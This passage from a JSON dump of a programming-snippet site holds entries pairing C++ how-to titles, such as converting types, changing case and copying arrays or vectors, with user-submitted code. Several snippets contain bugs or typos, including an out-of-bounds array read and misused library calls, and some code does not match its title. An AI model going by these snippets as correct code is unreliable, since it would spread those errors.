\t\t\t\tcheck \t\t\t\t\t= check.substr(0, i) + \".\" \t\t\t\t\t+ check.substr(i, l - i + 4);  \t\t\t\t// cout<< check <<endl; \t\t\t\t// Check for the validity of combination \t\t\t\tif (is_valid(check)) { \t\t\t\t\tans.push_back(check); \t\t\t\t\tstd::cout << check << '\\n'; \t\t\t\t} \t\t\t\tcheck = ip; \t\t\t} \t\t} \t} }  // Driver code int main() { \tstring A = \"25525511135\"; \tstring B = \"25505011535\";  \tconvert(A); \tconvert(B);  \treturn 0; }  // This code is contributed by Harshit \n    string word;\n123456789101112131415161718192021222324252627#include <iostream>#include <bits/stdc++.h>using namespace std;class ABS{    public:        void abs(int arr[], int n){    sort(arr, arr+n);    int c=0,i;    for (i=n-1;i-2>=0;i--){        if (arr[i-2]+arr[i-1]>arr[i]){            c=1;            break;        }    }    (c) ? cout<<arr[i-2]<<\" \"<<arr[i-1]<<\" \"<<arr[i]<<endl : cout<<-1<<endl;}};int main(){    ABS abx;    int arr[] = { 5,4,3,1,2};    int n = sizeof(arr) / sizeof(arr[0]);    abx.abs(arr, n);    return 0;}X\n",
    "reg_date": "2021-10-12T11:39:20.000Z"
  },
  {
    "id": 1582,
    "keyword": null,
    "link": null,
    "title": " convert c program to c ++  online",
    "description": "// Ex.14 A C Program to find greatest of 3 numbers (nested-if) #include<conio.h> #include<stdio.h> void main() { int x,y,z; clrscr(); printf(\"Enter three values\\n\"); scanf(\"%d%d%d\",&x,&y,&z); if(x>y) \t{ \t\tif(x>z) \t\tprintf(\"%d is greater\",x); \t} else if(y>z) \tprintf(\"%d is greater\",y); else \tprintf(\"%d is greater\",z); getch(); }\n",
    "reg_date": "2021-10-12T11:39:20.000Z"
  },
  {
    "id": 1583,
    "keyword": null,
    "link": null,
    "title": " convert char or string to int or double",
    "description": "#include <sstream>  using namespace std;  int main() {     stringstream str;          str << \"1\";      double x;     str >> x; }\n",
    "reg_date": "2021-10-12T11:39:20.000Z"
  },
  {
    "id": 1584,
    "keyword": null,
    "link": null,
    "title": " convert char to int c++",
    "description": "char a = '6'; //bounded by 0 and 9 int n1 = a - '0';  int n2 = a - 48;  int n3 = std::stoi(&a);\nint x = std::stoi(\"42\")\nint x = character - '0'\nint x  = '9' - 48; // x now equals 9 as an integer\nchar a = '4'; int ia = a - '0';\n#include <sstream>  using namespace std;  int main() {     stringstream str;          str << \"1\";      double x;     str >> x; }\n",
    "reg_date": "2021-10-12T11:39:20.000Z"
  },
  {
    "id": 1585,
    "keyword": null,
    "link": null,
    "title": " convert characters to lowercase c++",
    "description": "str[i] = tolower(str[i]);\n",
    "reg_date": "2021-10-12T11:39:20.000Z"
  },
  {
    "id": 1586,
    "keyword": null,
    "link": null,
    "title": " convert decimal to binary c++",
    "description": "string bin_string = \"10101010\"; int number =0; number = stoi(bin_string, 0, 2); // number = 170\n // C++ program to convert a decimal  // number to binary number     #include <iostream>  using namespace std;     // function to convert decimal to binary  void decToBinary(int n)  {      // array to store binary number      int binaryNum[32];         // counter for binary array      int i = 0;      while (n > 0) {             // storing remainder in binary array          binaryNum[i] = n % 2;          n = n / 2;          i++;      }         // printing binary array in reverse order      for (int j = i - 1; j >= 0; j--)          cout << binaryNum[j];  }     // Driver program to test above function  int main()  {      int n = 17;      decToBinary(n);      return 0;  } \n- Convert decimal to binary string using std::bitset int n = 10000; string s = bitset<32>(n).to_string(); // 32 is size of n (int)\n// C++ program for decimal to binary   #include <iostream> #include <algorithm> #include <string> #include <vector>   using namespace std;   int main() {      vector<int>nums; // list that will hold binary values      int num = 0;      cout<<\"Number: \"<<endl;     cin>>num; // number input      int i=0; // iterator for vector      while(num!=0)     {         nums.push_back(num%2); // adds binary value to the back of string          i++; // i gets incremented for the next position in vector          num=num/2;      }       reverse(nums.begin(),nums.end()); // reverses order of vector         for(auto x:nums)     {         cout<<x; // outputs stuff in vector      }   return 0;  }\n",
    "reg_date": "2021-10-12T11:39:20.000Z"
  },
  {
    "id": 1587,
    "keyword": null,
    "link": null,
    "title": " convert decimal to binary in c++",
    "description": " // C++ program to convert a decimal  // number to binary number     #include <iostream>  using namespace std;     // function to convert decimal to binary  void decToBinary(int n)  {      // array to store binary number      int binaryNum[32];         // counter for binary array      int i = 0;      while (n > 0) {             // storing remainder in binary array          binaryNum[i] = n % 2;          n = n / 2;          i++;      }         // printing binary array in reverse order      for (int j = i - 1; j >= 0; j--)          cout << binaryNum[j];  }     // Driver program to test above function  int main()  {      int n = 17;      decToBinary(n);      return 0;  } \n- Convert decimal to binary string using std::bitset int n = 10000; string s = bitset<32>(n).to_string(); // 32 is size of n (int)\n// C++ program for decimal to binary   #include <iostream> #include <algorithm> #include <string> #include <vector>   using namespace std;   int main() {      vector<int>nums; // list that will hold binary values      int num = 0;      cout<<\"Number: \"<<endl;     cin>>num; // number input      int i=0; // iterator for vector      while(num!=0)     {         nums.push_back(num%2); // adds binary value to the back of string          i++; // i gets incremented for the next position in vector          num=num/2;      }       reverse(nums.begin(),nums.end()); // reverses order of vector         for(auto x:nums)     {         cout<<x; // outputs stuff in vector      }   return 0;  }\n",
    "reg_date": "2021-10-12T11:39:20.000Z"
  },
  {
    "id": 1588,
    "keyword": null,
    "link": null,
    "title": " convert from uppercase to lowercase c++",
    "description": "str[i] = tolower(str[i]);\nint i = 0;     while(str[i])     {         if(str[i] == std::toupper(str[i]) && std::isalpha(str[i]) == 1024)         str[i]+= 32;         ++i;     }\n",
    "reg_date": "2021-10-12T11:39:20.000Z"
  },
  {
    "id": 1589,
    "keyword": null,
    "link": null,
    "title": " convert hex to decimal arduino",
    "description": " #include <stdlib.h>  long strtol (const char *__nptr, char **__endptr, int __base) \nlong decimal_answer = strtol(\"0005607947\", NULL, 16); \n",
    "reg_date": "2021-10-12T11:39:20.000Z"
  },
  {
    "id": 1590,
    "keyword": null,
    "link": null,
    "title": " convert int to binary string c++",
    "description": "std::string str = std::bitset<8>(123).to_string(); \nauto int_bits_size = 32; // maximum number of bits for the integer auto some_integer = 123456789; std::string str = std::bitset<int_bits_size>(some_integer).to_string();\n",
    "reg_date": "2021-10-12T11:39:20.000Z"
  },
  {
    "id": 1591,
    "keyword": null,
    "link": null,
    "title": " convert int to string c++",
    "description": "#include <string>   std::string s = std::to_string(42);\n#include <iostream> #include<string> using namespace std; int main() { int i = 11; float f = 12.3; string str = to_string(i); strinf fstr = to_string(f); }\n#include <string> using namespace std;  int iIntAsInt = 658; string sIntAsString = to_string(iIntAsInt);\nint x = 5; string str = to_string(x);\n#include <iostream>   #include<string>   using namespace std;   int main()   {    int i=11;      string str= to_string(i);      cout<<\"string value of integer i is :\"<<str<<\"\\n\";    return 0; }  \n#include <string>   std::string s = std::to_string(42); \n",
    "reg_date": "2021-10-12T11:39:21.000Z"
  },
  {
    "id": 1592,
    "keyword": null,
    "link": null,
    "title": " convert integer to string c++",
    "description": "#include <string>   std::string s = std::to_string(42);\n#include <iostream> #include<string> using namespace std; int main() { int i = 11; float f = 12.3; string str = to_string(i); strinf fstr = to_string(f); }\n#include <string> using namespace std;  int iIntAsInt = 658; string sIntAsString = to_string(iIntAsInt);\nint x = 5; string str = to_string(x);\nstd::to_string(23213.123)\nstring str_val = to_string(int_val);\n",
    "reg_date": "2021-10-12T11:39:21.000Z"
  },
  {
    "id": 1593,
    "keyword": null,
    "link": null,
    "title": " convert java code to c++ online",
    "description": "public class Jeep extends Vehicle{      public Jeep() {     }      public Jeep(String vehicleType, int enginePower, int technology, float price, float tax, int wheelCategory, String registrationNumber) {         super(vehicleType, enginePower, technology, price, tax, wheelCategory, registrationNumber);     }      @Override     public float getPrice() {         return (enginePower * 3500 * wheelCategory) + 1000 + (technology * 1000);     }      @Override     public float getTax() {         return (this.getPrice() * 0.2f) + 200;     } }\nimport edu.princeton.cs.algs4.CollisionSystem; import edu.princeton.cs.algs4.Particle; import edu.princeton.cs.algs4.StdDraw; public class TestAlgs4 {     public static void main(String[] args) {         int n = 20;  // number of particles (default 20)         if (args.length == 1) {             n = Integer.parseInt(args[0]);}         // enable double buffering to support animations         StdDraw.enableDoubleBuffering();         // create the n particles         Particle[] particles = new Particle[n];         for (int i = 0; i < n; i++) {             particles[i] = new Particle();         }         // simulate the system         CollisionSystem system = new CollisionSystem(particles);         system.simulate(Double.POSITIVE_INFINITY);     } }\npublic int rotatedWords(String input1, int input2) {     int c= 0;     String arr[] = input1.split(\" \");     if (input1 != null && !input1.isEmpty()) {         for (int i = 0; i < arr.length; i++) {             String s1 = arr[i] + arr[i];             int start = arr[i].length() - input2;              System.out.println(\"arr[i] : \" + arr[i]);             String s2 = s1.substring(start, start + arr[i].length());             System.out.println(\"s2 : \" + s2);             if (s2.equalsIgnoreCase(arr[i])) {                 count++;             }         }     }     return count; }\n// Client side implementation of UDP client-server model #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <string.h> #include <sys/types.h> #include <sys/socket.h> #include <arpa/inet.h> #include <netinet/in.h>  #define PORT\t 8080 #define MAXLINE 1024  // Driver code int main() { \tint sockfd; \tchar buffer[MAXLINE]; \tchar *hello = \"Hello from client\"; \tstruct sockaddr_in\t servaddr;  \t// Creating socket file descriptor \t \tclose(sockfd); \treturn 0; } \nimport java.util.*;  class Pair{ \tint totalNodes, totalSum; \tPair(int total, int sum){ \t\tthis.totalNodes = total; \t\tthis.totalSum = sum; \t} }  class MaxTenureFinder { \tpublic static Pair findHighestTenure(HashMap<Integer, ArrayList<Integer>> hmap, int V){ \t\tif(hmap.get(V).size() == 0){ \t\t\treturn new Pair(1, V); \t\t} \t\telse{ \t\t\tint totalNodesCount = 1; \t\t\tint totalSum = V; \t\t\tfor(int i=0;i<hmap.get(V).size();i++){ \t\t\t\tPair temp = findHighestTenure(hmap, hmap.get(V).get(i)); \t\t\t\ttotalNodesCount += temp.totalNodes; \t\t\t\ttotalSum += temp.totalSum; \t\t\t} \t\t\t \t\t\tif(totalSum * maxSum.totalNodes >= maxSum.totalSum * totalNodesCount){ // logic to avoid precision error \t\t\t\tmaxSum.totalNodes = totalNodesCount; \t\t\t\tmaxSum.totalSum = totalSum; \t\t\t\tmaxTenureNode = V; \t\t\t} \t\t\t \t\t\treturn new Pair(totalNodesCount, totalSum); \t\t} \t} \t \tpublic static int maxTenureNode; \tpublic static Pair maxSum; \t \tpublic static void main (String[] args) throws java.lang.Exception \t{ \t\tScanner sc = new Scanner(System.in); \t\tint n = sc.nextInt(); \t\t \t\tHashMap<Integer, ArrayList<Integer>> hmap = new HashMap<> (); \t\t \t\tfor(int i=0;i<n;i++){ \t\t\tint parent = sc.nextInt(); \t\t\tint child = sc.nextInt(); \t\t\tif(hmap.containsKey(parent)){ \t\t\t\thmap.get(parent).add(child); \t\t\t} \t\t\telse{ \t\t\t\tArrayList<Integer> temp = new ArrayList<> (); \t\t\t\ttemp.add(child); \t\t\t\thmap.put(parent, temp); \t\t\t} \t\t\tif(!hmap.containsKey(child)){ \t\t\t\thmap.put(child, new ArrayList<> ()); \t\t\t} \t\t} \t\tint parentNode = sc.nextInt(); \t\tmaxSum = new Pair(0, 0); \t\tmaxTenureNode = -1; \t\tfindHighestTenure(hmap, parentNode); \t\tSystem.out.println(maxTenureNode); \t} }\npublic static int findMaximum(List<Integer> arr, int m) {              long l = 1 , r = (long)(1e9);                           while(l<=r){                  long mid = (l+r)/2;                                    if(!bool(arr , mid , m)) r = mid-1;                  else l = mid+1;              }                            return (int)r;                     }      static boolean bool(List<Integer> arr , long dif , int m){          int prv = 0;          int c = 1;          for(int i = 1 ; i<arr.size() ; i++){              if(arr.get(i) - arr.get(prv) >= dif){                  prv = i;                  c++;              }          }          if(c>=m) return true;          return false;      }      \nimport edu.princeton.cs.algs4.CollisionSystem; import edu.princeton.cs.algs4.Particle; import edu.princeton.cs.algs4.StdDraw; public class TestAlgs4 {     public static void main(String[] args) {         int n = 20;  // number of particles (default 20)         if (args.length == 1) {             n = Integer.parseInt(args[0]);         }         // enable double buffering to support animations         StdDraw.enableDoubleBuffering();         // create the n particles         Particle[] particles = new Particle[n];         for (int i = 0; i < n; i++) {             particles[i] = new Particle();}         // simulate the system         CollisionSystem system = new CollisionSystem(particles);         system.simulate(Double.POSITIVE_INFINITY);     } }\nclass Pair implements Comparable<Pair> {     public:       int wsf;       string psf;        Pair(int wsf, string psf){          this->wsf = wsf;          this->psf = psf;       }    int compareTo(Pair o){          return this->wsf - o->wsf;       }   } \nclass I{   int i;   public void printNum(){     System.out.println(i);   } }  class J extends I{   int j;   public void printNum(){     System.out.println(j);   } }  class Ans{   public static void main(String[] args){     J a = new J();     a.i = 5;     a.j = 7;     a.j = a.i;     a.printNum();   } }\nimport java.util.Scanner;  public class Sum_OrProduct {      public static void main(String[] args) {         Scanner sc = new Scanner(System.in);         int num = sc.nextInt();         int choice = sc.nextInt();         int sum = 0, prod = 1;         for (int i = 1; i <= num; i++) {             if (choice == 1) {                 sum = sum + i;             } else if (choice == 2) {                 prod = prod * i;             } else {                 System.out.println(-1);             }         }         System.out.println(sum);         System.out.println(prod);     }  }\n",
    "reg_date": "2021-10-12T11:39:21.000Z"
  },
  {
    "id": 1594,
    "keyword": null,
    "link": null,
    "title": " convert letters to uppercase in c++",
    "description": "char choice;  // it will instantly transform it to upper case without the need // to convert it to int first choice = (char)toupper(choice); \nstr[i] = toupper(str[i]);\n#include <iostream> #include <string> using namespace std;  int main() {     char letter;      cout << \"You will be asked to enter a character.\";     cout << \"\\nIf it is a lowercase character, it will be converted to uppercase.\";     cout << \"\\n\\nEnter a character. Press . to stop: \";      cin >> letter;      if(islower(letter))     {         letter = isupper(letter);         cout << letter;     }      while(letter != '.')     {         cout << \"\\n\\nEnter a character. Press . to stop: \";         cin >> letter;          if(islower(letter))         {             letter = toupper(letter);             cout << letter;         }     }      return 0; } \n",
    "reg_date": "2021-10-12T11:39:21.000Z"
  },
  {
    "id": 1595,
    "keyword": null,
    "link": null,
    "title": " convert long int to binary string c++",
    "description": "std::string str = std::bitset<8>(123).to_string(); \nauto int_bits_size = 32; // maximum number of bits for the integer auto some_integer = 123456789; std::string str = std::bitset<int_bits_size>(some_integer).to_string();\n",
    "reg_date": "2021-10-12T11:39:21.000Z"
  },
  {
    "id": 1596,
    "keyword": null,
    "link": null,
    "title": " convert refference to pointer c++",
    "description": "int& refference;  int* pointer = (int*)& refference;\n",
    "reg_date": "2021-10-12T11:39:21.000Z"
  },
  {
    "id": 1597,
    "keyword": null,
    "link": null,
    "title": " convert roman numeral to number javascript",
    "description": "function convertToRoman(num) { var numeral = \"\";  var arr = [  {number:1, roman: \"I\"},  {number:4, roman: \"IV\"},  {number:5, roman: \"V\"},  {number:9, roman: \"IX\"},  {number:10, roman: \"X\"},  {number:40, roman: \"XL\"},  {number:50, roman: \"L\"},  {number:90, roman: \"XC\"},  {number:100, roman: \"C\"},  {number:400, roman: \"CD\"},  {number:500, roman: \"D\"},  {number:900, roman: \"CM\"},  {number:1000, roman: \"M\"}  ]  while(num > 0){   var searching = arr.filter(function(myArr){     if(myArr.number <= num){       return myArr.number     }   })   var latest = searching.pop()   var full = Math.floor(num / latest.number)   for(let i = 0; i<full; i++){     numeral +=latest.roman   }   num = num % latest.number  }  return numeral  }  console.log(convertToRoman(36));\nfunction roman_to_Int(str1) { if(str1 == null) return -1; var num = char_to_int(str1.charAt(0)); var pre, curr;  for(var i = 1; i < str1.length; i++){ curr = char_to_int(str1.charAt(i)); pre = char_to_int(str1.charAt(i-1)); if(curr <= pre){ num += curr; } else { num = num - pre*2 + curr; } }  return num; }  function char_to_int(c){ switch (c){ case 'I': return 1; case 'V': return 5; case 'X': return 10; case 'L': return 50; case 'C': return 100; case 'D': return 500; case 'M': return 1000; default: return -1; } } console.log(roman_to_Int('XXVI')); console.log(roman_to_Int('CI'));\nclass Solution { public:     int romanNumber(char n)     {         switch (n)         {         case 'I':                 return (1);         case 'V':                 return (5);         case 'X':                 return (10);         case 'L':                 return (50);         case 'C':                 return (100);         case 'D':                 return (500);         case 'M':                 return (1000);         default:             return (0);                      }         return (0);     }     int romanToInt(string s)      {         int len = s.size();         int ans = romanNumber(s[0]);         for(int i=1;i<len;i++)         {             int prev = romanNumber(s[i-1]);             int current = romanNumber(s[i]);             if(prev>=current)             {                 ans += current;             }             else             {                 ans -= prev;                 current -= prev;                 ans += current;              }         }         return ans;     } };\n",
    "reg_date": "2021-10-12T11:39:21.000Z"
  },
  {
    "id": 1598,
    "keyword": null,
    "link": null,
    "title": " convert set to vector c++",
    "description": "#include <set> #include <vector>  std::vector<int> some_vector(some_set.begin(), some_set.end());\n#include <set> std::set<std::string> set_name(vector_name.begin(), vector_name.end());\nset <int> convertToSet(vector<int> v)  { \tset<int> s(v.begin(),v.end()); \treturn s; } \n",
    "reg_date": "2021-10-12T11:39:21.000Z"
  },
  {
    "id": 1599,
    "keyword": null,
    "link": null,
    "title": " convert std vector to array",
    "description": "std::vector<double> v; double* a = &v[0]; \n",
    "reg_date": "2021-10-12T11:39:21.000Z"
  },
  {
    "id": 1600,
    "keyword": null,
    "link": null,
    "title": " convert stirng to int c++",
    "description": "int thing = std::stoi(string);\n",
    "reg_date": "2021-10-12T11:39:22.000Z"
  },
  {
    "id": 1601,
    "keyword": null,
    "link": null,
    "title": " convert string to char c++",
    "description": "std::string myWord = \"myWord\"; char myArray[myWord.size()+1];//as 1 char space for null is also required strcpy(myArray, myWord.c_str());\n// \"std::string\" has a method called \"c_str()\" that returns a \"const char*\" // pointer to its inner memory. You can copy that \"const char*\" to a variable // using \"strcpy()\".  std::string str = \"Hello World\"; char buffer[50];  strcpy(buffer, str.c_str());  std::cout << buffer;\t//Output: Hello World  //POSTED BY eferion ON STACK OVERFLOW (IN SPANISH). \n",
    "reg_date": "2021-10-12T11:39:22.000Z"
  },
  {
    "id": 1602,
    "keyword": null,
    "link": null,
    "title": " convert string to number c++",
    "description": "#include <iostream> #include <string>  int main() {      std::string str = \"123\";     int num;      // using stoi() to store the value of str1 to x     num = std::stoi(str);      std::cout << num;      return 0; }\nint thing = std::stoi(string);\n// For C++11 and later versions string str1 = \"45\";  string str2 = \"3.14159\";  string str3 = \"31337 geek\";   int myint1 = stoi(str1);  int myint2 = stoi(str2);  int myint3 = stoi(str3);   // Output stoi(\"45\") is 45 stoi(\"3.14159\") is 3 stoi(\"31337 geek\") is 31337 \n#include <iostream> #include <string> using namespace std; int main() {       string s = \"10\";       try     {         int i = stoi(s);         cout << i << '\\n';     }     catch (invalid_argument const &e)     {         cout << \"Bad input: std::invalid_argument thrown\" << '\\n';     }     catch (out_of_range const &e)     {         cout << \"Integer overflow: std::out_of_range thrown\" << '\\n';     }       return 0; }\n#include <iostream> #include <sstream> using namespace std; int main() { \tstring str = \"123456\";  \tint n;   \tstringstream ( str ) >> n; \tcout << n; //Output:123456 \treturn 0; }\n//stoi() : The stoi() function takes a string as an argument and  //returns its value. Supports C++11 or above.  // If number > 10^9 , use stoll(). #include <iostream> #include <string> using namespace std; main() { \tstring str = \"12345678\"; \tcout << stoi(str); } \n",
    "reg_date": "2021-10-12T11:39:22.000Z"
  },
  {
    "id": 1603,
    "keyword": null,
    "link": null,
    "title": " convert string to stream c++",
    "description": "// stringstream::str #include <string>       // std::string #include <iostream>     // std::cout #include <sstream>      // std::stringstream, std::stringbuf  int main () {   std::stringstream ss;   ss.str (\"Example string\");   std::string s = ss.str();   std::cout << s << '\\n';   return 0; }\n",
    "reg_date": "2021-10-12T11:39:22.000Z"
  },
  {
    "id": 1604,
    "keyword": null,
    "link": null,
    "title": " convert unsigned long to string c++",
    "description": "//You can use stringstream else... #include <sstream>  template <class T> inline std::string to_string (const T& t) {     std::stringstream ss;     ss << t;     return ss.str(); } // You can convert any value to string by creating another variable and // importing your other non-string variable string to_string (unsigned long val);\n",
    "reg_date": "2021-10-12T11:39:22.000Z"
  },
  {
    "id": 1605,
    "keyword": null,
    "link": null,
    "title": " convert vector into array c++",
    "description": "double arr[100]; std::copy(v.begin(), v.end(), arr); \n",
    "reg_date": "2021-10-12T11:39:22.000Z"
  },
  {
    "id": 1606,
    "keyword": null,
    "link": null,
    "title": " convert vector to set c++",
    "description": "#include <set> #include <vector>  std::vector<int> some_vector(some_set.begin(), some_set.end());\n#include <set> std::set<std::string> set_name(vector_name.begin(), vector_name.end());\nset <int> convertToSet(vector<int> v)  { \tset<int> s(v.begin(),v.end()); \treturn s; } \n",
    "reg_date": "2021-10-12T11:39:22.000Z"
  },
  {
    "id": 1607,
    "keyword": null,
    "link": null,
    "title": " convert wchar t to to multibyte",
    "description": "const wchar_t* input = L\"Hello World\"; const size_t SIZE = 256; char result[SIZE]; int resultSize = wcstombs(result, input, SIZE);\n",
    "reg_date": "2021-10-12T11:39:22.000Z"
  },
  {
    "id": 1608,
    "keyword": null,
    "link": null,
    "title": " convert whole string to lowercase c++",
    "description": "#include<bits/stdc++.h>  using namespace std;  main() {      string s = \"Viet Nam\";      transform(s.begin(), s.end(), s.begin(), ::tolower); //lowercase     cout << s << endl;  } \n",
    "reg_date": "2021-10-12T11:39:23.000Z"
  },
  {
    "id": 1609,
    "keyword": null,
    "link": null,
    "title": " convert whole string to uppercase c++",
    "description": "#include<bits/stdc++.h>  using namespace std;     int main()  {      string s = \"Viet Nam\";      transform(s.begin(), s.end(), s.begin(), ::toupper);  //uppercase     cout << s << endl;      return 0;  } \n/* toupper example */ #include <stdio.h> #include <ctype.h> int main () {   int i=0;   char str[]=\"Test String.\\n\";   char c;   while (str[i])   {     c=str[i];     putchar (toupper(c));     i++;   }   return 0; }\nstd::string data = \"This is a sample string.\"; // convert string to upper case std::for_each(data.begin(), data.end(), [](char & c){ c = ::toupper(c); });\nint i = 0;     while(str[i])     {         if(str[i] == std::toupper(str[i]) && std::isalpha(str[i]) == 1024)         str[i]+= 32;         ++i;     }\n",
    "reg_date": "2021-10-12T11:39:23.000Z"
  },
  {
    "id": 1610,
    "keyword": null,
    "link": null,
    "title": " converter c para c++ online",
    "description": "#include <stdio.h> #include <stdlib.h>  int main (void){ \tint vetor [2]; \tint *v; // ponteiro \tv = vetor; \tv[0] = 123; \tv[1] = 456; \tprintf (\"vetor[0] = %d\\n\", vetor[0]); \tprintf (\"vetor[1] = %d\\n\\n\", vetor[1]); \tsystem (\"pause\"); }\n// C++ program to generate all possible // valid IP addresses from given string #include <bits/stdc++.h> using namespace std;  // Function checks whether IP digits // are valid or not. int is_valid(string ip) { \t// Splitting by \".\" \tvector<string> ips; \tstring ex = \"\"; \tfor (int i = 0; i < ip.size(); i++) { \t\tif (ip[i] == '.') { \t\t\tips.push_back(ex); \t\t\tex = \"\"; \t\t} \t\telse { \t\t\tex = ex + ip[i]; \t\t} \t} \tips.push_back(ex);  \t// Checking for the corner cases \t// cout << ip << endl; \tfor (int i = 0; i < ips.size(); i++) { \t\t// cout << ips[i] <<endl; \t\tif (ips[i].length() > 3 \t\t\t|| stoi(ips[i]) < 0 \t\t\t|| stoi(ips[i]) > 255) \t\t\treturn 0;  \t\tif (ips[i].length() > 1 \t\t\t&& stoi(ips[i]) == 0) \t\t\treturn 0;  \t\tif (ips[i].length() > 1 \t\t\t&& stoi(ips[i]) != 0 \t\t\t&& ips[i][0] == '0') \t\t\treturn 0; \t} \treturn 1; }  // Function converts string to IP address void convert(string ip) { \tint l = ip.length();  \t// Check for string size \tif (l > 12 || l < 4) { \t\tcout << \"Not Valid IP Address\"; \t}  \tstring check = ip; \tvector<string> ans;  \t// Generating different combinations. \tfor (int i = 1; i < l - 2; i++) { \t\tfor (int j = i + 1; j < l - 1; j++) { \t\t\tfor (int k = j + 1; k < l; k++) { \t\t\t\tcheck = check.substr(0, k) + \".\" \t\t\t\t\t\t+ check.substr(k, l - k + 2); \t\t\t\tcheck \t\t\t\t\t= check.substr(0, j) + \".\" \t\t\t\t\t+ check.substr(j, l - j + 3); \t\t\t\tcheck \t\t\t\t\t= check.substr(0, i) + \".\" \t\t\t\t\t+ check.substr(i, l - i + 4);  \t\t\t\t// cout<< check <<endl; \t\t\t\t// Check for the validity of combination \t\t\t\tif (is_valid(check)) { \t\t\t\t\tans.push_back(check); \t\t\t\t\tstd::cout << check << '\\n'; \t\t\t\t} \t\t\t\tcheck = ip; \t\t\t} \t\t} \t} }  // Driver code int main() { \tstring A = \"25525511135\"; \tstring B = \"25505011535\";  \tconvert(A); \tconvert(B);  \treturn 0; }  // This code is contributed by Harshit \n123456789101112131415161718192021222324252627#include <iostream>#include <bits/stdc++.h>using namespace std;class ABS{    public:        void abs(int arr[], int n){    sort(arr, arr+n);    int c=0,i;    for (i=n-1;i-2>=0;i--){        if (arr[i-2]+arr[i-1]>arr[i]){            c=1;            break;        }    }    (c) ? cout<<arr[i-2]<<\" \"<<arr[i-1]<<\" \"<<arr[i]<<endl : cout<<-1<<endl;}};int main(){    ABS abx;    int arr[] = { 5,4,3,1,2};    int n = sizeof(arr) / sizeof(arr[0]);    abx.abs(arr, n);    return 0;}X\n",
    "reg_date": "2021-10-12T11:39:23.000Z"
  },
  {
    "id": 1611,
    "keyword": null,
    "link": null,
    "title": " converting a string to lowercase inbuld function in cpp",
    "description": "#include <iostream> #include <algorithm> using namespace std;  int main() {    string my_str = \"Hello WORLD\";     cout << \"Main string: \" << my_str << endl;    transform(my_str.begin(), my_str.end(), my_str.begin(), ::tolower);     cout << \"Converted String: \" << my_str; }\n",
    "reg_date": "2021-10-12T11:39:23.000Z"
  },
  {
    "id": 1612,
    "keyword": null,
    "link": null,
    "title": " converting char to int in c++",
    "description": "int x = std::stoi(\"42\")\n#include <sstream>  using namespace std;  int main() {     stringstream str;          str << \"1\";      double x;     str >> x; }\n",
    "reg_date": "2021-10-12T11:39:23.000Z"
  },
  {
    "id": 1613,
    "keyword": null,
    "link": null,
    "title": " converting char to integer c++",
    "description": "int x = std::stoi(\"42\")\nint x = character - '0'\nint x  = '9' - 48; // x now equals 9 as an integer\n",
    "reg_date": "2021-10-12T11:39:23.000Z"
  },
  {
    "id": 1614,
    "keyword": null,
    "link": null,
    "title": " copy 2 dimensional array c++",
    "description": "//COPY 2D ARRAY TO ANOTHER 2D ARRAY for (int x=0 ; x < 50; x++) {   for (int y=0 ; y < 50; y++)   {     b[x][y] = a[x][y];   } }\n",
    "reg_date": "2021-10-12T11:39:23.000Z"
  },
  {
    "id": 1615,
    "keyword": null,
    "link": null,
    "title": " copy a part of a vector in another in c++",
    "description": "  // Copying vector by copy function  copy(vect1.begin(), vect1.end(), back_inserter(vect2)); \n",
    "reg_date": "2021-10-12T11:39:23.000Z"
  },
  {
    "id": 1616,
    "keyword": null,
    "link": null,
    "title": " copy array c++",
    "description": "#include <algorithm> #include <iterator>  const int arr_size = 10; some_type src[arr_size]; // ... some_type dest[arr_size]; std::copy(std::begin(src), std::end(src), std::begin(dest)); \n#include <algorithm> //Only needed for Option 1 #include <iostream>  using namespace std;  int main() {   \t//Option 1     const int len{3};     int arr1[len] = {1,2,3};     int arr2[len]; //Will be the copy of arr1     copy(begin(arr1), end(arr1), begin(arr2));      \t//Use the following, if you are not using namespace std;     //std::copy(std::begin(arr), std::end(arr), std::begin(copy));        //Option 2     int arr3[len]; //Will be the copy of arr1     for(int i = 0; i<len; ++i) {       arr3[i] = arr1[3];     }          return 0; //exitcode };\n",
    "reg_date": "2021-10-12T11:39:23.000Z"
  },
  {
    "id": 1617,
    "keyword": null,
    "link": null,
    "title": " copy file to vector c++",
    "description": "//Read file to the end while(inFile.read(reinterpret_cast<char*>(&temp), sizeof(temp))) {     //Store each int in the vector     myVector.push_back(temp); }\n",
    "reg_date": "2021-10-12T11:39:23.000Z"
  },
  {
    "id": 1618,
    "keyword": null,
    "link": null,
    "title": " copy smaller array into array cpp",
    "description": "unsigned char *a1 = arr1; unsigned char *a2 = arr2; for (int x = 0; x < 768; x++) //copy each row {     memcpy(a1, a2, nc);     a1 += 1024;     a2 += 768; } \n",
    "reg_date": "2021-10-12T11:39:24.000Z"
  },
  {
    "id": 1619,
    "keyword": null,
    "link": null,
    "title": " copy string in c++",
    "description": "#include <stdio.h> #include <stdlib.h> #include <string.h> #define sg struct gammal struct gammal {     char name[20];     int payment;     struct gammal *next; }; void add (sg *g){     char name[20];     int payment;     printf(\"Enter Name: \");     scanf(\"%s\",name);     printf(\"Enter Payment: \");     scanf(\"%d\",&payment);     if(g->payment == -1){         strcpy(g->name,name);         g->payment = payment;         g->next = NULL;     }     else {         while(g->next != NULL)             g = g->next;         g->next = (sg*)malloc(sizeof(sg));         g = g->next;         strcpy( g->name,name);         g->payment = payment;         g->next = NULL;     } } void show (sg *g){     while ( g != NULL){         printf(\"---------\");         printf(\"%s \",g->name);         printf(\"%d \",g->payment);         g = g->next;     } } int main() {     sg *g =(sg*)malloc(sizeof(sg));     g->payment = -1;     add(g);     add(g);     show(g); }\n//use '=' to copy string string s1={\"Hello\"}; string s2; s2=s1;\t//now s2 will have a copu s1\n",
    "reg_date": "2021-10-12T11:39:24.000Z"
  },
  {
    "id": 1620,
    "keyword": null,
    "link": null,
    "title": " copying a set to vector in c++",
    "description": "std::set<T> s;  //...  std::vector v( s.begin(), s.end() ); \n",
    "reg_date": "2021-10-12T11:39:24.000Z"
  },
  {
    "id": 1621,
    "keyword": null,
    "link": null,
    "title": " copying a vector to another",
    "description": "// Declaring new vector and copying // element of old vector // constructor method, Deep copy vector<int> vect2(vect1);\n// Using assignment operator to copy one // vector to other vect2 = vect1;\n",
    "reg_date": "2021-10-12T11:39:24.000Z"
  },
  {
    "id": 1622,
    "keyword": null,
    "link": null,
    "title": " cosnt cast",
    "description": "const_cast<type&>(const_variable)\n",
    "reg_date": "2021-10-12T11:39:24.000Z"
  },
  {
    "id": 1623,
    "keyword": null,
    "link": null,
    "title": " could not find the task c c++ active file",
